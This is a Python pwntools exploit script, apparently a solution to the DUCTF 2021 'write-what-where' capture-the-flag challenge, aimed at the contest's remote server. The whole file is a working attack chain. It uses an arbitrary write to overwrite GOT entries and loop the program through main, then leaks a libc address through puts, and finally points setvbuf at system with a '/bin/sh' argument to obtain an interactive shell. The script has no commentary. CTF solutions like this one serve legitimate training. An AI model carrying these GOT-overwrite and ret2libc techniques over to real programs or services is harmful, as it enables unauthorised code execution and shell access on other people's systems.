from pwn import *

r=remote("pwn-2021.duc.tf", 31920)
# r=process("./write-what-where")
b=ELF("./write-what-where")
context.log_level='debug'
lib=ELF("./libc.so.6")
# lib=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
exit=0x404038
r.send(p32(b.sym['main']+33))
r.send(str(exit).rjust(9,'0'))

r.send(p32(b.plt['puts']))
r.send(str(b.got['setvbuf']).rjust(9,'0'))

r.send(p32(0))
r.send(str(b.got['setvbuf']+4).rjust(9,'0'))
r.send(p32(0x404050))
r.send(str(0x404060).rjust(9,'0'))

r.send(p32(0))
r.send(str(0x404060+4).rjust(9,'0'))
r.send(p32(b.sym['main']))  
r.send(str(exit).rjust(9,'0'))

base=u64(r.recvuntil(b'\x7f')[:-7:-1][::-1].ljust(8,b'\x00'))-lib.sym['_IO_2_1_stdout_']
log.info(hex(base))
system=base+lib.sym['system']
binsh=base+list(lib.search(b'/bin/sh'))[0]
log.info(hex(system))
r.send(p32(b.sym['main']+33))
r.send(str(exit).rjust(9,'0'))
r.send(p32(system&0xffffffff))
r.send(str(b.got['setvbuf']).rjust(9,'0'))

r.send(p32((system>>32)))
r.send(str(b.got['setvbuf']+4).rjust(9,'0'))

r.send(p32(binsh&0xffffffff))
r.send(str(0x404060).rjust(9,'0'))
r.send(p32((binsh>>32)))
r.send(str(0x404064).rjust(9,'0'))
# r.send(b'/sh\x00')
# r.send(str(0x404054).rjust(9,'0'))
# r.send(b'/sh\x00')
# r.send(str(0x404054).rjust(9,'0'))
r.send(p32(b.sym['main']))
r.send(str(exit).rjust(9,'0'))

r.interactive()